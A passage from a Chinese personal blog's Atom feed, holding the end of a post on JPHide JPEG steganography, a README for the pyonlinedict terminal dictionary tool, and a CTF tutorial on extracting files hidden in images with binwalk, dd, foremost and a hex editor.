id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="http://mall.cnki.net/magazine/article/JSJC201006056.htm" target="_blank" rel="external">Jphide原理剖析及检测</a></p><p><a href="http://www.cnki.com.cn/Article/CJFDTotal-JSJC200707054.htm" target="_blank" rel="external">基于二次加密的JPhide隐写检测方法</a></p>]]></content>
    
    <summary type="html">
    
      #0X00-隐写原理0X00 隐写原理
Jphide是基于最低有效位LSB的JPEG格式
[http://www.cnblogs.com/leaven/archive/2010/04/06/1705846.html]
图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域
[https://en.wikipedia.org/wiki/Discrete_cosine_transform]
上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法
[http://baike.baidu.com/link?url=OWM-kQRYlFaJ2Sy7m1E_Z_-fnvknJTRSHwk1f3eoabLsbht1TJa07GmvWRoiOg6U7-0-Ey3vb_UHcDm9Pc7Mgq]
有较强的抗统计检测能力。

由于JPEG图像格式使用离散余弦变换
[http://baike.baidu.com/view/391624.htm?fr=aladdin&amp;fromtitle=DCT&amp;fromid=4184&amp;type=syn]
（Discrete Cosine
Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种
有损压缩
[http://baike.baidu.com/link?url=7eIl--nFUaz-amKaY9jatpW4J-J2JyZEXy8dYJM4Py1CspzR9mUATKgTyXOCt7M6AjFSv4JmF3YKtXTTAauHm_]
（Loss Compression）技术，但一般不会影响图像的视觉效果。

#0X01-隐写过程0X01 隐写过程
Jphide隐写过程大致为：先解压压缩JPEG图像，得到DCT系数；然后对隐藏信息用户给定的密码进行Blowfish加密；再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片，下面是个人对隐写过程理解画出的大致流程图。

[http://i.imgur.com/kb6USbH.png]
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="jphide隐写" scheme="https://sunnyelf.github.io/tags/jphide%E9%9A%90%E5%86%99/"/>
    
      <category term="隐写" scheme="https://sunnyelf.github.io/tags/%E9%9A%90%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>pyonlinedict Linux终端在线字典</title>
    <link href="https://sunnyelf.github.io/2017/01/26/pyonlinedict-Linux%E7%BB%88%E7%AB%AF%E5%9C%A8%E7%BA%BF%E5%AD%97%E5%85%B8/"/>
    <id>https://sunnyelf.github.io/2017/01/26/pyonlinedict-Linux终端在线字典/</id>
    <published>2017-01-25T20:22:00.000Z</published>
    <updated>2017-10-02T19:22:31.719Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2016/10/597107301.gif" alt="pyonliedict.gif"></p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>有时候使用linux，在终端经常遇到一些不会的英文单词句子，又嫌难得再去开个浏览器去查，于是便动手写一个在终端就可以查询的脚本，有兴趣将将就用用吧。</p><h1 id="0x01-中文说明"><a href="#0x01-中文说明" class="headerlink" title="0x01 中文说明"></a>0x01 中文说明</h1><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><p>pyonlinedict是一个基于python 2.7开发的命令行在线字典，支持27种语言的字词或句子翻译查询，当我们遇到不会字词或句子时，可以通过它轻松查询意思。</p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/sunnyelf/pyonlinedict.git</div><div class="line"></div><div class="line">cd pyonlinedict</div><div class="line"></div><div class="line">tar -xzvf pyonlinedict-1.0.6.tar.gz</div><div class="line"></div><div class="line">python setup.py install --record install_path.txt</div></pre></td></tr></table></figure><p>或者直接：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install pyonlinedict</div></pre></td></tr></table></figure><p></p><h2 id="4-用法"><a href="#4-用法" class="headerlink" title="4.用法"></a>4.用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">用法：pyonlinedict [选项]</div><div class="line"></div><div class="line">  选项：</div><div class="line">   -h，--help         显示帮助消息并退出</div><div class="line">   </div><div class="line">   -q，--query        要查询的字或句子（必需的参数）</div><div class="line">   </div><div class="line">   -f，--from         输入语言的类型（默认设置：auto）</div><div class="line">   </div><div class="line">   -t，--to           输出语言的类型（默认设置：zh）</div><div class="line">   </div><div class="line">   -l，--list         列出支持的语言类型</div><div class="line">   </div><div class="line">   -v，-version       显示当前版本号和作者信息</div><div class="line"></div><div class="line">  用例：</div><div class="line">  </div><div class="line">   pyonlinedict -h</div><div class="line">   </div><div class="line">   pyonlinedict -l</div><div class="line">   </div><div class="line">   pyonlinedict -v</div><div class="line">   </div><div class="line">   pyonlinedict -q hello</div><div class="line">   </div><div class="line">   pyonlinedict -q hello -f en -t zh</div><div class="line">   </div><div class="line">   pyonlinedict -q &apos;hello world&apos; -f en -t zh</div></pre></td></tr></table></figure><h2 id="5-卸载"><a href="#5-卸载" class="headerlink" title="5.卸载"></a>5.卸载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat install_path.txt | xargs rm -rf</div></pre></td></tr></table></figure><p>通过pip方式安装的卸载方法：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip uninstall pyonliedict</div></pre></td></tr></table></figure><p></p><a id="more"></a><h1 id="0x02-英文说明"><a href="#0x02-英文说明" class="headerlink" title="0x02 英文说明"></a>0x02 英文说明</h1><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2><p>Pyonlinedict is a command-line online dictionary based on Python 2.7 that supports queries in 27 languages or sentences. It is easy to find meaning when we encounter words or sentences that are not words or sentences.</p><h2 id="2-Installation"><a href="#2-Installation" class="headerlink" title="2.Installation"></a>2.Installation</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/suunyelf/pyonlinedict.git</div><div class="line"></div><div class="line">cd pyonlinedict</div><div class="line"></div><div class="line">tar -xzvf pyonlinedict-1.0.6.tar.gz</div><div class="line"></div><div class="line">python setup.py install --record install_path.txt</div><div class="line"></div><div class="line">Or directly:</div><div class="line"></div><div class="line">pip install pyonlinedict</div></pre></td></tr></table></figure><h2 id="3-Usage"><a href="#3-Usage" class="headerlink" title="3.Usage"></a>3.Usage</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">Usage: pyonlinedict [options]</div><div class="line"></div><div class="line"> Options: </div><div class="line"> </div><div class="line">  -h, --help          Show help message and exit</div><div class="line">  </div><div class="line">  -q, --query         The word or sentence to be queried(required parameters)</div><div class="line">  </div><div class="line">  -f, --from          The type of the input language(default setting:auto)</div><div class="line">  </div><div class="line">  -t, --to            The type of the output language(default setting:zh)</div><div class="line">  </div><div class="line">  -l, --list          List the supported language types</div><div class="line">  </div><div class="line">  -v, --version       Displays the current version number and author information</div><div class="line"></div><div class="line"> Usages: </div><div class="line"> </div><div class="line">  pyonlinedict -h</div><div class="line">  </div><div class="line">  pyonlinedict -l</div><div class="line">  </div><div class="line">  pyonlinedict -v</div><div class="line">  </div><div class="line">  pyonlinedict -q hello</div><div class="line">  </div><div class="line">  pyonlinedict -q hello -f en -t zh</div><div class="line">  </div><div class="line">  pyonlinedict -q 'Hello world!' -f en -t zh</div></pre></td></tr></table></figure><h2 id="5-Uninstall"><a href="#5-Uninstall" class="headerlink" title="5.Uninstall"></a>5.Uninstall</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat install_path.txt | xargs rm -rf</div></pre></td></tr></table></figure><p>Unloading method installed by pip:<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install pyonliedict</div></pre></td></tr></table></figure><p></p>]]></content>
    
    <summary type="html">
    
      pyonliedict.gif [https://www.hackfun.org/usr/uploads/2016/10/597107301.gif]

#0X00-前言0X00 前言
有时候使用linux，在终端经常遇到一些不会的英文单词句子，又嫌难得再去开个浏览器去查，于是便动手写一个在终端就可以查询的脚本，有兴趣将将就用用吧。

#0X01-中文说明0X01 中文说明
#1-介绍1.介绍
pyonlinedict是一个基于python
2.7开发的命令行在线字典，支持27种语言的字词或句子翻译查询，当我们遇到不会字词或句子时，可以通过它轻松查询意思。

#2-安装2.安装
1234567

git clone https://github.com/sunnyelf/pyonlinedict.gitcd pyonlinedicttar -xzvf pyonlinedict-1.0.6.tar.gzpython setup.py install --record install_path.txt

或者直接：


1

pip install pyonlinedict



#4-用法4.用法
12345678910111213141516171819202122232425262728

用法：pyonlinedict [选项]  选项：   -h，--help         显示帮助消息并退出      -q，--query        要查询的字或句子（必需的参数）      -f，--from         输入语言的类型（默认设置：auto）      -t，--to           输出语言的类型（默认设置：zh）      -l，--list         列出支持的语言类型      -v，-version       显示当前版本号和作者信息  用例：     pyonlinedict -h      pyonlinedict -l      pyonlinedict -v      pyonlinedict -q hello      pyonlinedict -q hello -f en -t zh      pyonlinedict -q &#39;hello world&#39; -f en -t zh

#5-卸载5.卸载
1

cat install_path.txt | xargs rm -rf

通过pip方式安装的卸载方法：


1

pip uninstall pyonliedict
    
    </summary>
    
      <category term="神兵利器" scheme="https://sunnyelf.github.io/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="python下的命令行在线字典" scheme="https://sunnyelf.github.io/tags/python%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9C%A8%E7%BA%BF%E5%AD%97%E5%85%B8/"/>
    
      <category term="pyonlinedict" scheme="https://sunnyelf.github.io/tags/pyonlinedict/"/>
    
  </entry>
  
  <entry>
    <title>CTF中图片隐藏文件分离方法总结</title>
    <link href="https://sunnyelf.github.io/2017/01/12/CTF%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>https://sunnyelf.github.io/2017/01/12/CTF中图片隐藏文件分离方法总结/</id>
    <published>2017-01-11T20:22:00.000Z</published>
    <updated>2017-10-02T19:22:31.600Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在安全的大趋势下，信息安全越来越来受到国家和企业的重视，所以CTF比赛场次越来越多，而且比赛形式也不断的创新，题目也更加新颖有趣，对选手的综合信息安全能力有一个较好的考验，当然更好的是能从比赛有所收获，不断学习和总结提升自己的信息安全能力与技术。转到CTF比赛上，通常在CTF比赛中常有与隐写术(Steganography)相关的题目出现，这里我们讨论总结图片隐藏文件分离的方法，欢迎大家补充和交流:P</p><a id="more"></a><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>这里我们以图片为载体，给了这样的一样图片：</p><p><img src="http://img0.tuicool.com/QVVreiR.jpg" alt="CTF中图片隐藏文件分离方法总结"></p><p>首先我们需要对图片进行分析，这里我们需要用到一个工具<a href="https://github.com/devttys0/binwalk" target="_blank" rel="external">binwalk</a>，想要了解这个工具可以参考这篇<a href="http://www.freebuf.com/sectool/15266.html" target="_blank" rel="external">Binwalk：后门（固件）分析利器</a>文章，以及<a href="http://tools.kali.org/forensics/binwalk" target="_blank" rel="external">kali官方对binwalk的概述和使用介绍</a>。</p><p>这里我们就是最简单的利用，在binwalk后直接提供固件文件路径和文件名即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> binwalk carter.jpg</div></pre></td></tr></table></figure><p>当我们使用这行命令后，binwalk就会自动分析这个jpg文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> binwalk carter.jpg</div><div class="line"> </div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">382           0x17E           Copyright string: "Copyright (c) 1998 Hewlett-Packard Company"</div><div class="line">3192          0xC78           TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">140147        0x22373         JPEG image data, JFIF standard 1.01</div><div class="line">140177        0x22391         TIFF image data, big-endian, offset of first image directory: 8</div></pre></td></tr></table></figure><p>从上面的内容显然看得出来这个jpg文件还隐藏着另一个jpg文件，从140147块偏移开始就是另一张jpg。</p><h2 id="0x02-分离"><a href="#0x02-分离" class="headerlink" title="0x02 分离"></a>0x02 分离</h2><p>在得到隐藏信息之后我们下一步就是把另一张jpg分离出，以下讨论几种方法：</p><p><strong>（1）使用dd命令分离(linux/unix下)</strong></p><p>我们可以使用dd命令分离出隐藏文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1</div></pre></td></tr></table></figure><p>可以参考<a href="http://www.cnblogs.com/qq78292959/archive/2012/02/23/2364760.html" target="_blank" rel="external">dd命令详解</a>，这里if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过140147个块后再开始复制，bs设置每次读写块的大小为1字节 。</p><p>最后我们可以得到这样的一张carter-1.jpg图片：</p><p><img src="http://img0.tuicool.com/maqeiyb.jpg" alt="CTF中图片隐藏文件分离方法总结"></p><p><strong>（2）使用foremost工具分离</strong></p><p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载地址，Linux可以<br>通过下面命令安装使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> apt-get install foremost</div></pre></td></tr></table></figure><p>安装foremost后你可以使用foremost -help查看使用帮助，这里最简单分离文件的命令为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> foremost carter.jpg</div></pre></td></tr></table></figure><p>当我们使用这行命令后，foremost会自动生成output目录存放分离出文件：</p><p><img src="http://img2.tuicool.com/73Ub2iF.png" alt="CTF中图片隐藏文件分离方法总结"></p><p><strong>（3）hex编辑器分析文件</strong></p><p>至于hex编辑器有很多，win下有用得较多的winhex,UltraEdit等，linux下有hexeditor等，这里我们以winhex为例手动分离，在分离之前我们需要知道一点关于jpg文件格式的知识，jpg格式文件开始的2字节是图像开始SOI(Start of Image,SOI)为FF D8，之后2个字节是JFIF应用数据块APPO(JFIF application segment)为FF E0 ，最后2个字节是图像文件结束标记EOI(end-of-file)为FF D9 ，如果你想详细了解更多关于这方面的知识可以参考<a href="http://blog.csdn.net/liuqz2009/article/details/8270355" target="_blank" rel="external">jpg文件格式分析</a>一文。</p><p>用winhex打开图片，通过Alt+G快捷键输入偏移地址22373跳转到另一张jpg的图像开始块，可以看到FF D8图像开始块。</p><p><img src="http://img2.tuicool.com/QFjmuqr.png" alt="CTF中图片隐藏文件分离方法总结"></p><p>而图像结束块FF D9</p><p><img src="http://img0.tuicool.com/aqmqe2z.png" alt="CTF中图片隐藏文件分离方法总结"></p><p>选取使用Alt+1快捷键选取FF为开始的块，Alt+2选取D9为结束块，然后右键-&gt;Edit-&gt;Copy Block-&gt;Into New File保存相应的文件后缀，例如new.jpg</p><p><img src="http://img1.tuicool.com/IvYJVbB.png" alt="CTF中图片隐藏文件分离方法总结"></p><h2 id="0x03-其他"><a href="#0x03-其他" class="headerlink" title="0x03 其他"></a>0x03 其他</h2><p>还有一种特例，它是事先制作一个hide.zip，里面放入隐藏的文件，再需要一张jpg图片example.jpg，然后再通过命令 copy /b example.jpg+hide.zip output.jpg生成output.jpg的新文件，原理是利用了copy命令，将两个文件以二进制方式连接起来，正常的jpg文件结束标志是FF D9，而图片查看器会忽视jpg结束符之后的内容，所以我们附加的hide.zip就不会影响到图像的正常显示。(参考AppLeU0的<a href="http://drops.wooyun.org/tips/4862" target="_blank" rel="external">隐形术总结</a>)</p><p>针对这种特例我们可以直接将jpg文件改为zip文件后缀(其他文件如rar文件也类似)，就可以看到hide.zip压缩包里隐藏的文件。</p><p>比如当我们得到一张wh3r3_is_f14g.jpg文件：</p><p><img src="http://img2.tuicool.com/byqU7nY.jpg" alt="CTF中图片隐藏文件分离方法总结"></p><p>当我们用winhex打开文件，发现wh3r3_is_f14g.jpg文件最后数据块不是FF D9 jpg文件的结束标志，而是zip文件的结束标志。</p><p><img src="http://img2.tuicool.com/IBbuY3N.png" alt="CTF中图片隐藏文件分离方法总结"></p><p>我们直接将文件改名为wh3r3_is_f14g.zip，打开得到flag.txt。</p><p><img src="http://img2.tuicool.com/Vj2aQrE.png" alt="CTF中图片隐藏文件分离方法总结"></p><p>最后打开flag.txt得到flag。</p><p><img src="http://img0.tuicool.com/ZjIJrqZ.jpg" alt="CTF中图片隐藏文件分离方法总结"></p><h2 id="0x03-后话"><a href="#0x03-后话" class="headerlink" title="0x03 后话"></a>0x03 后话</h2><p>图片隐写方式有很多种，在此只介绍了这一种，如果以后有机会会写其他的图片隐写，如果对隐写感兴趣这里推荐一本机械工业出版社的《数据隐藏技术揭秘：破解多媒体、操作系统、移动设备和网络协议中的隐秘数据》，如果你不想购买实体书，可以<a href="http://www.jb51.net/books/434273.html" target="_blank" rel="external">下载pdf版</a>。</p><p>这里我把所有图片打包了zip，如果有需要自行下载吧: P</p><p><a href="https://www.hackfun.org/usr/uploads/2016/07/3701056190.zip" target="_blank" rel="external">Steganography_Pictures.zip</a></p>]]></content>
    
    <summary type="html">
    
      #0X00-前言0X00 前言
在安全的大趋势下，信息安全越来越来受到国家和企业的重视，所以CTF比赛场次越来越多，而且比赛形式也不断的创新，题目也更加新颖有趣，对选手的综合信息安全能力有一个较好的考验，当然更好的是能从比赛有所收获，不断学习和总结提升自己的信息安全能力与技术。转到CTF比赛上，通常在CTF比赛中常有与隐写术(Steganography)相关的题目出现，这里我们讨论总结图片隐藏文件分离的方法，欢迎大家补充和交流:P
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="ctf" scheme="https://sunnyelf.github.io/tags/ctf/"/>
    
      <category term="隐写术" scheme="https://sunnyelf.github.io/tags/%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    
      <category term="ctf隐写" scheme="https://sunnyelf.github.io/tags/ctf%E9%9A%90%E5%86%99/"/>
    
      <category term="ctf中图片隐藏文件分离" scheme="https://sunnyelf.github.io/tags/ctf%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB/"/>
    
  </entry>
  
</feed>
